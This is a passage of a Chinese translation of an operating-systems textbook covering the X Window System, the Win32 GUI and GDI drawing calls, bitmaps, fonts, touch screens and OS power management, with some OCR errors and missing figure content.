(0x1B),n 、m 和s是可选的数值参数
2.X 窗口系统
X只是一个窗口系统，它不是一个完全的GUI 。
为了获得完全的GUI, 要在其上运行其他软件层。
一层是Xlib, 它是一组库过程，用于访问X的功能。
这些过程形成了X窗口系统的基础，我们将在下面 对其进行分析，但是这些过程过于原始了，以至于大多数用户程序不能直接访问它们。
例如，每次鼠标
Athena (雅典娜)指麻省理工学院 (MIT) 校园范围内基于UNIX的计算环境。
——译者注
点击是单独报告的，所以确定两次点击实际上形成了双击必须在Xlib 之上处理。
远程主机
网络
这一模块化设计，包括若干层和多个程序，使得X高度可移植和高度灵活。
它已经被移植到UNIX的 大 多数版本上，包括Solaris 、BSD 的所有派生版本、AIX 、Linux 等，这就使得对于应用程序开发人员来说在 多种平台上拥有标准的用户界面成为可能。
它还被移植到其他操作系统上。
相反，在Windows 中，窗口与 GUI系统在GDI中混合在一起并且处于内核之中，这使得它们维护起来十分困难，并且当然是不可移植的。
四种类型的消息通过连接传递：
1)从程序到工作站的绘图命令。
2)工作站对程序请求的应答。
3)键盘、鼠标以及其他事件的通告。
4)错误消息。
事件。
例如，如果一个程序不想得知键释放的消息，那么键释放的任何事件都不会发送给它。
与在 Windows中一样，事件是排成队列的，程序从队列中读取事件。
然而，与Windows 不同的是，操作系统 绝对不会主动调用在应用程序之内的过程，它甚至不知道哪个过程处理哪个事件。
X中的一个关键概念是资源 (resource) 。
资源是一个保存一定信息的数据结构。
应用程序在工作站 上创建资源。
在工作站上，资源可以在多个进程之间共享。
资源的存活期往往很短，并且当工作站重新 启动后资源不会继续存在。
典型的资源包括窗口、字体、颜色映射(调色板)、像素映射(位图)、光标 以及图形上下文。
图形上下文用于将属性与窗口关联起来，在概念上与Windows的设备上下文相类似。
图5-34 X窗口应用程序的框架
主循环由两条语句构成，并且在逻辑上比Windows中对应的循环要简单得多。
此处，第一条语句获 得一个事件，第二条语句对事件类型进行分派从而进行处理。
当某个事件表明程序已经结束的时候， running 被设置为0,循环结束。
在退出之前，程序释放了图形上下文、窗口和连接。
以在这些窗口中工作。
3.图形用户界面
大多数个人计算机提供了GUI(Graphical User Interface,图形用户界面)。
首字母缩写词GUI 的发 音是 “gooey”。
GUI 是由斯坦福研究院的Douglas Engelbart和他的研究小组发明的。
之后GUI 被Xerox PARC的研究 人员模仿。
在一个风和日丽的日子，Apple 公司的共同创立者Steve Jobs参观了PARC, 并且在一 台Xerox 计算机上见到了GUI。
这使他产生了开发一种新型计算机的想法，这种新型计算机就是Apple Lisa 。
Lisa 因为太过昂贵因而在商业上是失败的，但是它的后继者Macintosh 获得了巨大的成功。
当Microsoft 得到Macintosh 的原型从而能够在其上开发Microsoft Office时 ，Microsoft 请求Apple 发放 界面许可给所有新来者，这样Macintosh 就能够成为新的业界标准。
(Microsoft 从Office 获得了比MS- DOS多得多的收入，所以它愿意放弃MS-DOS 以获得更好的平台用于Office 。
)Apple 负责Macintosh 的 主 管Jean-Louis Gassee拒绝了Microsoft 的请求，并且Steve Jobs已经离开了Apple 而不能否决他。
最终， Microsoft 得到了界面要素的许可证，这形成了Windows 的基础。
当Microsoft 开始追上Apple 时 ，Apple 提 起了对Microsoft 的诉讼，声称Microsoft 超出了许可证的界限，但是法官并不认可，并且Windows 继续追 赶并超过了Macintosh 。
如 果Gassee 同 意Apple内部许多人的看法(他们也希望将Macintosh 软件许可给任 何人),那么Apple 或许会因为许可费而变得无限富有，并且现在就不会存在Windows 了。
暂时撇开触摸屏使能的接口不谈，GUI 具有用字符WIMP 表示的四个基本要素，这些字母分别代表 窗 口 (Window) 、 图 标 (Icon) 、 菜 单(Menu) 和定点设备 (Pointing device)。
窗口是一个矩形块状的 屏幕区域，用来运行程序。
图标是小符号，可以在其上点击导致某个动作发生。
菜单是动作列表，人们 可以从中进行选择。
最后，定点设备是鼠标、轨迹球或者其他硬件设备，用来在屏幕上移动光标以便选 择项目。
GUI 软件可以在用户级代码中实现(如UNIX 系统所做的那样),也可以在操作系统中实现(如 Windows的情况)。
GUI 系统的输入仍然使用键盘和鼠标，但是输出几乎总是送往特殊的硬件电路板，称为图形适配器 (graphics adapter)。
图形适配器包含特殊的内存，称为视频RAM(video RAM),它保存出现在屏幕上的 图像。
图形适配器通常具有强大的32位或64位CPU和多达1GB自己的RAM, 独立于计算机的主存。
每个图形适配器支持几种屏幕尺寸。
常见的尺寸(水平×垂直像素)是1280×960、1600×1200、 1920×1080、2560×1600和3840×2160。
事实上，许多分辨率的宽高比都是4:3,符合NTSC 和PAL电 视 机的屏幕宽高比，因此在把相同的监视器用作电视机时可以产生正方形的像素。
更高的分辨率意在用于 宽屏监视器上，它的宽高比与这一分辨率相匹配。
假设某显示器的分辨率是1920×1080(全高清视频的 尺寸),每个像素具有24位的色彩，只是保存图像就需要大约6.5MB的RAM, 所以，拥有256MB 或更多 的RAM, 图形适配器就能够一次保存许多图像。
如果整个屏幕每秒刷新75次，那么视频RAM 必须能够 连续地以每秒445MB的速率发送数据。
GUI的输出软件是一个巨大的主题。
单是关于Windows GUI就写下了许多1500多页的书(例如 Petzold,2013;Rector 和Newcomer,1997;Simon,1997) 。
显然，在这一小节中，我们只可能浅尝其 表面并且介绍少许基本的概念。
为了使讨论具体化，我们将描述Win32 API,它 被Windows的所有32位 版本所支特。
在一般意义上，其他GUI的输出软件大体上是相似的，但是细节迥然不同。
屏幕上的基本项目是一个矩形区域，称为窗口 (window) 。
窗口的位置和大小通过给定两个斜对角 的坐标(以像素为单位)唯一地决定。
窗口可以包含一个标题栏、 一个菜单栏、 一个工具栏、 一个垂直 滚动条和一个水平滚动条。
典型的窗口如图5-35所示。
注意，Windows 的坐标系将原点置于左上角并且y 向下增长，这不同于数学中使用的笛卡儿坐标。
当窗口被创建时，有一些参数可以设定窗口是否可以被用户移动，是否可以被用户调整大小，或者 是否可以被用户滚动(通过拖动滚动条)。
大多数程序产生的主窗口可以被移动、调整大小和滚动，这 对于Windows 程序的编写方式具有重大的意义。
特别地，程序必须被告知关于其窗口大小的改变，并且 必须准备在任何时刻重画其窗口的内容，即使在程序最不期望的时候。
(0,0) (1023,0)
(0,767) (1023,767)
图5-35 XGA 显示器上位于(200,100)处的一个窗口样例
因 此 ，Windows 程序是面向消息的。
涉及键盘和鼠标的用户操作被Windows 所捕获，并且转换成消 息，送到正在被访问的窗口所属于的程序。
每个程序都有一个消息队列，与程序的所有窗口相关的消息 都被发送到该队列中。
程序的主循环包括提取下一条消息，并且通过调用针对该消息类型的内部过程对 其进行处理。
在某些情况下，Windows 本身可以绕过消息队列而直接调用这些过程。
这一模型与UNIX的 过程化代码模型完全不同，UNIX模型是提请系统调用与操作系统相互作用的。
然而，X 是面向事件的。
主程序以一个声明开始，该声明给出了它的名字和参数。
WINAPI 宏是一条给编译器的指令，让编 译器使用一定的参数传递约定并且不需要我们进一步关心。
第一个参数h是一个实例句柄，用来向系统 的其他部分标识程序。
在某种程度上，Win32 是面向对象的，这意味着系统包含对象(例如程序、文件 和窗口)。
对象具有状态和相关的代码，而相关的代码称为方法 (method), 它对于状态进行操作。
对象 是使用句柄来引用的，在该示例中，h 标识的是程序。
第二个参数只是为了向后兼容才出现的，它已不 再使用。
第三个参数szCmd 是一个以零终止的字符串，包含启动该程序的命令行，即使程序不是从命令 行启动的。
第四个参数iCmdShow 表明程序的初始窗口应该占据整个屏幕，占据屏幕的一部分，还是一 点也不占据屏幕(只是占据任务条)。
该声明说明了一个广泛采用的Microsoft 约定，称为匈牙利表示法(Hungarian notation)。
该名称是 一个涉及波兰表示法的双关语，波兰表示法是波兰逻辑学家J.Lukasiewicz 发明的后缀系统，用于不使用 优先级和括号表示代数公式。
匈牙利表示法是Microsoft的一名匈牙利程序员Charles Simonyi发明的，它 使用标识符的前几个字符来指定类型。
允许的字母和类型包括c(character, 字符)、w(word, 字，现 在意指无符号16位整数)、i(integer,32 位有符号整数)、1(long, 也是一个32位有符号整数)、s (string, 字符串)、sz(string terminated by a zero byte,以零字节终止的字符串)、p(pointer, 指 针 ) 、 fn(function, 函 数 ) 和h(handle, 句柄)。
因此，举例来说，szCmd 是一个以零终止的字符串并且
iCmdShow 是一个整数。
许多程序员认为在变量名中像这样对类型进行编码没有什么价值，并且使 Windows代码异常地难于阅读。
在UNIX中就没有类似这样的约定。
图5-36 Windows 主程序的框架
每个窗口必须具有一个相关联的类对象定义其属性，在图5-36中，类对象是wndclass 。
对象类型 WNDCLASS具有10个字段，其中4个字段在图5-36中被初始化，在一个以实际的程序中，其他6个字段 也要被初始化。
最重要的字段是1pfnWndProc, 它是一个指向函数的长(即32位)指针，该函数处理引 向该窗口的消息。
此处被初始化的其他字段指出在标题条中使用哪个名字和图标，以及对于鼠标光标使 用哪个符号。
在wndclass 被初始化之后，RegisterClass 被调用，将其发送给Windows 。
特别地，在该调用之后 Windows就会知道当各种事件发生时要调用哪个过程。
下一个调用CreateWindow 为窗口的数据结构分配 内存并且返回一个句柄以便以后引用它。
然后，程序做了另外两个调用，将窗口轮廓置于屏幕之上，并 且最终完全地填充窗口。
此刻我们到达了程序的主循环，它包括获取消息，对消息做一定的转换，然后将其传回Windows 以 便让Windows 调用WndProc 来处理它。
要回答这一完整的机制是否能够得到化简的问题，答案是肯定的， 但是这样做是由于历史的缘故，并且我们现在坚持这样做。
消息类型WM_CREATE 和WM_DESTROY 分别在程序的开始和结束时发送。
它们给程序机会为数
据结构分配内存，并且将其返回。
Windows 有两种方法可以让一个程序做某些事情。
一种方法是投递一条消息到其消息队列。
这种方 法用于键盘输入、鼠标输入以及定时器到时。
另一种方法是发送一条消息到窗口，从而使Windows 直接 调 用WndProc 本身。
这一方法用于所有其他事件。
由于当一条消息完全被处理后Windows 会得到通报， 这样Windows 就能够避免在前一个调用完成前产生新的调用，由此可以避免竞争条件。
还有许多其他消息类型。
当一个不期望的消息到达时为了避免异常行为，最好在WndProc 的结尾处 调 用DefWindowProc, 让默认处理过程处理其他情形。
总 之 ，Windows 程序通常创建一个或多个窗口，每个窗口具有一个类对象。
与每个程序相关联的是 一个消息队列和一组处理过程。
最终，程序的行为由到来的事件驱动，这些事件由处理过程来处理。
与 UNIX 采用的过程化观点相比，这是一个完全不同的世界观模型。
对屏幕的实际绘图是由包含几百个过程的程序包处理的，这些过程捆在一起形成了GDI(Graphics Device Interface,图形设备接口)。
它能够处理文本和各种类型的图形，并且被设计成与平台和设备无 关的。
在一个程序可以在窗口中绘图(即绘画)之前，它需要获取一个设备上下文 (device context): 设备上下文是一个内部数据结构，包含窗口的属性，诸如当前字体、文本颜色、背景颜色等。
大多数 GDI调用使用设备上下文，不管是为了绘图，还是为了获取或设置属性。
有许许多多的方法可用来获取设备上下文。
下面是一个获取并使用设备上下文的简单例子：
hdc=GetDC(hwnd);
TextOut(hdc,x,y,psText,iLength);
ReleaseDC(hwnd,hdc);
第一条语句获取一个设备上下文的句柄hdc 。
第二条语句使用设备上下文在屏幕上写一行文本，该 语句设定了字符串开始处的(x,y) 坐标、 一个指向字符串本身的指针以及字符串的长度。
第三个调用 释放设备上下文，表明程序在当时已通过了绘图操作。
注意，hdc 的使用方式与UNIX的文件描述符相类 似。
还需要注意的是，ReleaseDC 包含冗余的信息(使用hdc 就可以唯一地指定一个窗口)。
使用不具有 实际价值的冗余信息在Windows 中是很常见的。
GDI 的完全论述超出了这里讨论的范围。
对于感兴趣的读者，上面引用的参考文献提供了补充的信 息。
然而，关于GDI 可能还值得再说几句话，因为GDI 是如此之重要。
GDI 具有各种各样的过程调用以 获取和释放设备上下文，获取关于设备上下文的信息，获取和设置设备上下文的属性(例如背景颜色), 使 用GDI 对象(例如画笔、画刷和字体，其中每个对象都有自己的属性)。
最后，当然存在许多实际在 屏幕上绘图的GDI 调用。
绘图过程分成四种类型：绘制直线和曲线、绘制填充区域、管理位图以及显示文本。
我们在上面看 到了绘制文本的例子，所以让我们快速地看看其他类型之一。
调用
Rectangle(hdc,xleft,ytop,xright,ybottom);
将绘制一个填充的矩形，它的左上角和右下角分别是 (xleft,ytop) 和 (xright,ybottom) 。
例如，
Rectangle(hdc,2,1,6,4);
将绘制一个如图5-37所示的矩形。
线宽和颜色以及填充颜色取
自设备上下文。
其他的GDI 调用在形式上是类似的。
0 1 2 3 4 5 67 8
4.位图
GDI过程是矢量图形学的实例。
它们用于在屏幕上放置几
何图形和文本。
它们能够十分容易地缩放到较大和较小的屏幕
(如果屏幕上的像素数是相同的)。
它们还是相对设备无关的。
一组对GDI过程的调用可以聚集在一个文件中，描述一个复杂
的图画。
这样的文件称为Wind ows元文件 (metafile), 广泛地
用于从一个Windows程序到另一个Windows程序传送图画。
这
样的文件具有扩展名.wmf。
图5-37 使用Rectangle 绘制矩形的例
许多Windows程序允许用户复制图画(或一部分)并且放 子。
每个方框代表一个像素
在Windows 的剪贴板上，然后用户可以转入另一个程序并且粘
贴剪贴板的内容到另一个文档中。
做这件事的一种方法是由第一个程序将图画表示为Windows 元文件并 且将其以.wmf格式放在剪贴板上。
此外，还有其他的方法做这件事。
并不是计算机处理的所有图像都能够使用矢量图形学来生成。
例如，照片和视频就不使用矢量图形 学。
反之，这些项目可以通过在图像上覆盖一层网格扫描输入。
每一个网格方块的平均红、绿、蓝取值被 采样并且保存为一个像素的值。
这样的文件称为位图 (bitmap) 。
Windows 中有大量的工具用于处理位图。
使用位图的一种常规方法是通过调用BitBlt 过程，该过程调用如下：
BitBIt(dsthdc,dx,dy,wid,ht,srchdc,sx,sy,rasterop);
在其最简单的形式中，该过程从一个窗口中的一个矩形复制位图到另一个窗口(或同一个窗口)的 一个矩形中。
前三个参数设定目标窗口和位置，然后是宽度和高度，接下来是源窗口和位置。
注意，每 个窗口都有其自己的坐标系，(0,0)在窗口的左上角处。
最后一个参数将在下面描述。
BitBIt(hdc2,1,2,5,7,hdcl,2,2,SRCCOPY);
的效果如图5-38所示。
注意字母A的整个5×7区域被复制了，包括背景颜色。
8
0.24.68 0p
2
窗口2-
a) b)
图5-38 使 用BitBlt 复制位图：a) 复制前；b) 复制后
除了复制位图外，BitBlt 还可以做很多事情。
最后一个参数提供了执行布尔运算的可能，从而可以 将源位图与目标位图合并在一起。
例如，源位图可以与目标位图执行或运算，从而融入目标位图；源位 图还可以与目标位图执行异或运算，该运算保持了源位图和目标位图的特征。
位图具有的一个问题是它们不能缩放。
8×12方框内的一个字符在640×480的显示器上看起来是适 度的。
然而，如果该位图以每英寸1200点复制到10200位×13200位的打印页面上，那么字符宽度(8像
素)为8/1200英寸或0.17mm。
此外，在具有不同彩色属性的设备之间进行复制，或者在单色设备与彩色 设备之间进行复制效果并不理想。
由于这样的缘故，Windows 还支持一个称为DIB(Device Independent Bitmap, 设备无关的位图) 的数据结构。
采用这种格式的文件使用扩展名.bmp。
这些文件在像素之前具有文件与信息头以及一个颜 色表，这样的信息使得在不同的设备之间移动位图十分容易。
5.字体
在Windows 3.1版之前的版本中，字符表示为位图，并且使用BitBlt 复制到屏幕上或者打印机上。
这 样做的问题是，正如我们刚刚看到的，在屏幕上有意义的位图对于打印机来说太小了。
此外，对于每一 尺寸的每个字符，需要不同的位图。
换句话说，给定字符A的10点阵字型的位图，没有办法计算它的12 点阵字型。
因为每种字体的每一个字符可能都需要从4点到120点范围内的各种尺寸，所以需要的位图的 数目是巨大的。
整个系统对于文本来说简直是太笨重了。
图5-39 不同点阵尺寸的字符轮廓的一些例子
一旦填充的字符在数学形式上是可用的，就可以对它进行栅格化，也就是说，以任何期望的分辨率 将其转换成位图。
通过首先缩放然后栅格化，我们可以肯定显示在屏幕上的字符与出现在打印机上的字 符将是尽可能接近的，差别只在于量化误差。
为了进一步改进质量，可以在每个字符中嵌入表明如何进 行栅格化的线索。
例如，字母T 顶端的两个衬线应该是完全相同的，否则由于舍入误差可能就不是这样 的情况了。
这样的线索改进了最终的外观。
6.触摸屏
触摸设备并不一定是屏幕。
触摸设备分成两类：非透明的和透明的。
典型的非透明触摸设备是笔记 本电脑上的触摸板。
透明设备的例子是智能手机或平板电脑上的触摸屏。
然而，在本节中，我们只讨论 触摸屏。
如同在计算机产业中流行起来的许多其他事物一样，触摸屏并不是全新的东西。
早在1965年，英国 皇家雷达研究院 (British Royal Radar Establishment) 的 E.A.Johnson 就描述了一种(电容式)触摸显示 器，虽然很简陋，但是被视为我们今天所见到的显示器的先驱。
大多数现代触摸屏是电阻式的或者是电 容式的。
层ITO的面。
在上表面，电荷沿垂直方向运动，并且在上下存在导电连接。
在底下一层，电荷沿水平方 向运动，并且在左右存在连接。
当你触摸屏幕时，会使塑料凹陷，从而使顶层ITO与底层相接触。
为了 找到手指或触笔接触的准确位置，你所要做的就是在底层的所有水平位置和顶层的所有垂直位置沿两个 方向对电阻进行测量。
电阻屏的好处是由压力决定测量的产出。
换句话说，即便在寒冷的天气下带着手套触摸，它仍然可 以工作。
电容屏则不是这样，除非你带着特别的手套。
例如，你可以缝上一根导线(比如镀银尼龙)穿 过手套的指尖，要是不会做针线活的话，也可以买现成的。
还有一个办法，你可以把手套的指尖部分剪 去，并且在10秒钟内完成操作。
电阻屏不好的地方在于它们一般不能支持多点触控 (multitouch), 这是一种同时检测多个触点的技 术。
它允许你在屏幕上用两个或者更多的手指操作目标物。
人(或许还有猩猩)喜欢多点触控，因为它 使人可以用两个手指采用捏拢和张开的手势来放大或者缩小图像或文档。
想象一下两个手指分别位于 (3,3)和(8,8)。
结果是，电阻屏可能注意到在x=3 和x=8 的垂直线，以及y=3 和y=8 的水平线处电 阻发生的变化。
现在考虑一个不同的场景，手指位于(3,8)和(8,3),这是角点为(3,3)、(8,3)、 (8,8)和(3,8)的矩形的两个相对的角点。
电阻在完全相同的线处发生了变化，所以软件没有办法分 辨两个场景中是哪一个发生了。
这一问题被称为鬼影 (ghosting) 。
因为电容屏发送的是 (x,y) 坐标串， 所以它更擅长支持多点触控。
多年来，主流计算范式一直在中心化计算和分散化计算之间振荡。
最早的计算机(例如ENIAC) 虽 然是庞然大物，但实际上是个人计算机，因为一次只有一个人能够使用它。
然后出现的是分时系统，在 分时系统中许多远程用户在简单的终端上共享一个大型的中心计算机。
接下来是PC时代，在这一阶段用 户再次拥有他们自己的个人计算机。
虽然分散化的PC模型具有长处，但是它也有着某些严重的不利之处，人们刚刚开始认真思考这些 不利之处。
或许最大的问题是，每台PC都有一个大容量的硬盘以及复杂的软件必须维护。
例如，当操作 系统的一个新版本发布时，必须做大量的工作分别在每台机器上进行升级。
在大多数公司中，做这类软 件维护的劳动力成本大大高于实际的硬件与软件成本。
对于家庭用户而言，在技术上劳动力是免费的， 但是很少有人能够正确地做这件事，并且更少有人乐于做这件事。
对于一个中心化的系统，只有一台或 几台机器必须升级，并且有专家班子做这些工作。
一个相关的问题是，用户应该定期地备份他们的几G字节的文件系统，但是很少有用户这样做。
当 灾难袭来时，相随的将是仰天长叹和捶胸顿足。
对于一个中心化的系统，自动化的磁带机器人在每天夜 里都可以做备份。
e 在昆汀 ·塔伦蒂诺执导的影片《杀死比尔》的最后，女主角用五雷摧心掌杀死了比尔。
——译者注
256MB RAM,在大多数时间这个系统的这些RAM 大多是空闲的，然而某些用户临时需要大量的RAM 但 是却得不到，因为RAM在别人的PC上。
对于一个具有64GB RAM的中心化系统，这样的事情绝不会发 生。
同样的论据对于磁盘空间和其他资源也是有效的。
5.8 电源管理
第一代通用电子计算机ENIAC具有18000个电子管并且消耗140000瓦的电力。
结果，它迅速积累 起非同一般的电费账单。
晶体管发明后，电力的使用量戏剧性地下降，并且计算机行业失去了在电力需 求方面的兴趣。
然而，如今电源管理由于若干原因又像过去一样成为焦点，并且操作系统在这里扮演着 重要的角色。
我们从桌面PC开始讨论。
桌面PC通常具有200瓦的电源(其效率一般是85%,15%进来的能量损失 为热量)。
如果全世界1亿台这样的机器同时开机，合起来它们要用掉20000兆瓦的电力。
这是20座中等 规模的核电站的总产出。
如果电力需求能够削减一半，我们就可以削减10座核电站。
从环保的角度看， 削减10座核电站(或等价数目的矿物燃料电站)是一个巨大的胜利，非常值得追求。
另一个要着重考虑电源的场合是电池供电的计算机，包括笔记本电脑、掌上机以及Web便笺簿等。
问题的核心是电池不能保存足够的电荷以持续非常长的时间，至多也就是几个小时。
此外，尽管电池公 司、计算机公司和消费性电子产品公司进行了巨大的研究努力，但进展仍然缓慢。
对于一个已经习惯于 每18个月性能翻一番(摩尔定律)的产业来说，毫无进展就像是违背了物理定律，但这就是现状。
因此， 使计算机使用较少的能量因而现有的电池能够持续更长的时间就高悬在每个人的议事日程之上。
操作系 统在这里扮演着主要的角色，我们将在下面看到这一点。
在最低的层次，硬件厂商试图使他们的电子装置具有更高的能量效率。
使用的技术包括减少晶体管 的尺寸、利用动态电压调节、使用低摆幅并隔热的总线以及类似的技术。
这些内容超出了本书的范围， 感兴趣的读者可以在Venkatachalam和Franz(2005) 的论文中找到很好的综述。
存在两种减少能量消耗的一般方法。
第一种方法是当计算机的某些部件(主要是I/O 设备)不用的 时候由操作系统关闭它们，因为关闭的设备使用的能量很少或者不使用能量。
第二种方法是应用程序使 用较少的能量，这样为了延长电池时间可能会降低用户体验的质量。
我们将依次看一看这些方法，但是 首先就电源使用方面谈一谈硬件设计。
5.8.1 硬件问题
电池一般分为两种类型： 一次性使用的和可再充电的。
一次性使用的电池(AAA 、AA 与D电池) 可以用来运转掌上设备，但是没有足够的能量为具有大面积发光屏幕的笔记本电脑供电。
相反，可再充
电的电池能够存储足够的能量为笔记本电脑供电几个小时。
在可再充电的电池中，镍镉电池曾经占据主 导地位，但是它们后来让位给了镍氢电池，镍氢电池持续的时间更长并且当它们最后被抛弃时不如镍镉 电池污染环境那么严重。
锂电池更好一些，并且不需要首先完全耗尽就可以再充电，但是它们的容量同 样非常有限。
大多数计算机厂商对于电池节约采取的一般措施是将CPU、 内存以及I/O设备设计成具有多种状态： 工作、睡眠、休眠和关闭。
要使用设备，它必须处于工作状态。
当设备在短时间内暂时不使用时，可以 将其置于睡眠状态，这样可以减少能量消耗。
当设备在一个较长的时间间隔内不使用时，可以将其置于 休眠状态，这样可以进一步减少能量消耗。
这里的权衡是，使一个设备脱离休眠状态常常比使一个设备 脱离睡眠状态花费更多的时间和能量。
最后，当一个设备关闭时，它什么事情也不做并且也不消耗电能。
并非所有的设备都具有这些状态，但是当它们具有这些状态时，应该由操作系统在正确的时机管理状态 的变迁。
某些计算机具有两个甚至三个电源按钮。
这些按钮之一可以将整个计算机置于睡眠状态，通过键入 一个字符或者移动鼠标，能够从该状态快速地唤醒计算机。
另一个按钮可以将计算机置于休眠状态，从 该状态唤醒计算机花费的时间要长得多。
在这两种情况下，这些按钮通常除了发送一个信号给操作系统 外什么也不做，剩下的事情由操作系统在软件中处理。
在某些国家，依照法律，电气设备必须具有一个 机械的电源开关，出于安全性考虑，该开关可以切断电路并且从设备撤去电能。
为了遵守这一法律，可 能需要另一个开关。
电源管理提出了操作系统必须处理的若干问题，其中许多问题涉及资源休眠——选择性地、临时性 地关闭设备，或者至少当它们空闲时减少它们的功率消耗。
必须回答的问题包括：哪些设备能够被控 制?
它们是工作的还是关闭的，或者它们具有中间状态吗?
在低功耗状态下节省了多少电能?
重启设备 消耗能量吗?
当进入低功耗状态时是不是必须保存某些上下文?
返回到全功耗状态要花费多长时间?
当 然，对这些问题的回答是随设备而变化的，所以操作系统必须能够处理一个可能性的范围。
许多研究人员研究了笔记本电脑以了解电能 的去向。
Li 等人(1994)测量了各种各样的工作 负荷，得出的结论如图5-40所示。
Lorch 和Smith (1998)在其他机器上进行了测量，得出的结论 如图5-40所示。
Weiser 等人(1994)也进行了测 量，但是没有发表数值结果。
这些结论清楚地说 明能量吸收的前三名依次是显示器、硬盘和CPU 。
可能因为测量的不同品牌的计算机确实具有不同 的能量需求，这些数字并不紧密地吻合，但是很 显然，显示器、硬盘和CPU 是节约能量的目标。
图5-40 笔记本电脑各部件的功率消耗
在智能手机这样的设备上，可能有其他的电能消耗，例如射频和GPS。
尽管在本节中我们聚焦在显示器、 磁盘、CPU 和内存上，但对于其他外部设备而言原理是同样的。
5.8.2 操作系统问题
操作系统在能量管理上扮演着一个重要的角色，它控制着所有的设备，所以它必须决定关闭什么设 备以及何时关闭。
如果它关闭了一个设备并且该设备很快再次被用户需要，可能在设备重启时存在恼人 的延迟。
另一方面，如果它等待了太长的时间才关闭设备，能量就白白地浪费了。
这里的技巧是找到算法和启发式方法，让操作系统对关于关闭什么设备以及何时关闭能够作出良好 的决策。
问题是“良好”是高度主观的。
一个用户可能觉得在30s未使用计算机之后计算机要花费2s的 时间响应击键是可以接受的。
另一个用户在相同的条件下可能会发出一连串的诅咒。
1.显示器
现在我们来看一看能量预算的几大消耗者，考虑一下对于它们能够做些什么。
在每个人的能量预算中 最大的项目之一是显示器。
为了获得明亮而清晰的图像，屏幕必须是背光照明的，这样会消耗大量的能量。
许多操作系统试图通过当几分钟的时间没有活动时关闭显示器而节省能量。
通常用户可以决定关闭的时间
间隔，因此将屏幕频繁地熄灭和很快用光电池之间的折中推回给用户(用户可能实际上并不希望这样)。
关 闭显示器是一个睡眠状态，因为当任意键被敲击或者定点设备移动时，它能够(从视频RAM) 即时地再生。
Flinn和Satyanarayanan(2004) 提出了一种可能的改进。
他们建议让显示器由若干数目的区域组成， 这些区域能够独立地开启和关闭。
在图5-41中，我们描述了16个区域，使用虚线分开它们。
当光标在窗 口2中的时候，如图5-41a所示，只有右下角的4个区域必须点亮。
其他12个区域可以是黑暗的，节省了 3/4的屏幕功耗。
a) b)
图5-41 针对背光照明的显示器使用区域：a) 当窗口2被选中时，该窗口不移动；b) 当窗口1被选中时， 该窗口移动以减少照明的区域的数目
2.硬盘
另一个主要的祸首是硬盘，它消耗大量的能量以保持高速旋转，即使不存在存取操作。
许多计算机， 特别是笔记本电脑，在几秒钟或者几分钟不活动之后将停止磁盘旋转。
当下一次需要磁盘的时候，磁盘 将再次开始旋转。
不幸的是，一个停止的磁盘是休眠而不是睡眠，因为要花费相当多的时间将磁盘再次 旋转起来，导致用户感到明显的延迟。
此外，重新启动磁盘将消耗相当多额外的能量。
因此，每个磁盘都有一个特征时间Ta为它的盈亏平 衡 点 ，T 通常在5～15s的范围之间。
假设下一次磁盘存取预计在未来的某个时间r到来。
如果1<T., 那么 保持磁盘旋转比将其停止然后很快再将其开启要消耗更少的能量。
如果I>T, 那么使得磁盘停止而后在 较长时间后再次启动磁盘是十分值得的。
如果可以做出良好的预测(例如基于过去的存取模式),那么 操作系统就能够做出良好的关闭预测并且节省能量。
实际上，大多数操作系统是保守的，往往是在几分 钟不活动之后才停止磁盘。
节省磁盘能量的另一种方法是在RAM中拥有一个大容量的磁盘高速缓存。
如果所需要的数据块在 高速缓存中，空闲的磁盘就不必为满足读操作而重新启动。
类似地，如果对磁盘的写操作能够在高速缓 存中缓冲，一个停止的磁盘就不必只为了处理写操作而重新启动。
磁盘可以保持关闭状态直到高速缓存 填满或者读缺失发生。
避免不必要的磁盘启动的另一种方法是：操作系统通过发送消息或信号保持将磁盘的状态通知给正 在运行的程序。
某些程序具有可以自由决定的写操作，这样的写操作可以被略过或者推迟。
例如， 一个 字处理程序可能被设置成每隔几分钟将正在编辑的文件写入磁盘。
如果字处理程序知道当它在正常情况 下应该将文件写到磁盘的时刻磁盘是关闭的，它就可以将本次写操作推迟直到下一次磁盘开启。
3.CPU
CPU 也能够被管理以节省能量。
笔记本电脑的CPU 能够用软件置为睡眠状态，将电能的使用减少到 几乎为零。
在这一状态下CPU唯一能做的事情是当中断发生时醒来。
因此，只要CPU变为空闲，无论是
因为等待I/O还是因为没有工作要做，它都可以进入睡眠状态。
在许多计算机上，在CPU电压、时钟周期和电能消耗之间存在着关系。
CPU 电压可以用软件降低， 这样可以节省能量但是也会(近似线性地)降低时钟速度。
由于电能消耗与电压的平方成正比，将电压 降低一半会使CPU的速度减慢一半，而电能消耗降低到只有1/4。
对于具有明确的最终时限的程序而言，这一特性可以得到利用，例如多媒体观察器必须每40ms解压缩 并显示一帧，但是如果它做得太快它就会变得空闲。
假设CPU全速运行40ms消耗了x焦耳能量，那么半速 运行则消耗x/4焦耳的能量。
如果多媒体观察器能够在20ms内解压缩并显示一帧，那么操作系统能够以全功 率运行20ms, 然后关闭20ms, 总的能量消耗是x/2焦耳。
作为替代，它能够以半功率运行并且恰好满足最 终时限，但是能量消耗是x/4焦耳。
以全速和全功率运行某个时间间隔与以半速和四分之一功率运行两倍长 时间的比较如图5-42所示。
在这两种情况下做了相同的工作，但是在图5-42b中只消耗了一半的能量。
a)
时间一→
b)
图5-42 a) 以全时钟速度运行；b) 电压减半使时钟速度削减一半并且功率削减到1/4
类似地，如果用户以每秒1个字符的速度键入字符，但是处理字符所需的工作要花费100ms的时间， 操作系统最好检测出长时间的空闲周期并且将CPU放慢10倍。
简而言之，慢速运行比快速运行具有更高 的能量效率。
4.内存
5.无线通信
越来越多的便携式计算机拥有到外部世界(例如Internet) 的无线连接。
无线通信必需的无线电发 送器和接收器是头等的电能贪吃者。
特别是，如果无线电接收器为了侦听到来的电子邮件而始终开着，
电池可能很快耗干。
另一方面，如果无线电设备在1分钟空闲之后关闭，那么就可能会错过到来的消息， 这显然是不受欢迎的。
针对这一问题，Kravets 和Krishnan(1998) 提出了一种有效的解决方案。
他们的解决方案的核心利 用了这样的事实，即移动的计算机是与固定的基站通信，而固定基站具有大容量的内存与磁盘并且没有 电源限制。
他们的解决方案是当移动计算机将要关闭无线电设备时，让移动计算机发送一条消息到基站。
从那时起，基站在其磁盘上缓冲到来的消息。
当移动计算机再次打开无线电设备时，它会通知基站。
此 刻，所有积累的消息可以发送给移动计算机。
当无线电设备关闭时，生成的外发的消息可以在移动计算机上缓冲。
如果缓冲区有填满的危险，可 以将无线电设备打开并且将排队的消息发送到基站。
应该在何时将无线电设备关闭?
